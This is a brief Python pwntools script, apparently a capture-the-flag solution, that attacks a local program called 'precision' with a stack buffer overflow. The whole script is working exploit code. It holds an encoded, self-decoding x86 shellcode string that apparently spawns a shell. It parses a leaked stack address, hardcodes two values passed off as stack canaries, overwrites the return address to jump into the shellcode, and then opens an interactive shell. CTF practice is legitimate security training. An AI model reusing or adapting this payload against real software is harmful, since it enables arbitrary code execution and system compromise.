from pwn import *


p = process("./precision")

shell = "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87"

canary = 0x475a31a5
canary2 = 0x40501555


ret = int(p.recvline()[-11:],16)
log.info("RET Address : "+str(hex(ret)))

log.info("Length of shellcode : "+str(len(shell)))

payload = 'A'*54
payload += shell
payload += p32(canary)
payload += p32(canary2)
payload += 'A'*12
payload += p32(ret)

p.sendline(payload)
p.interactive()
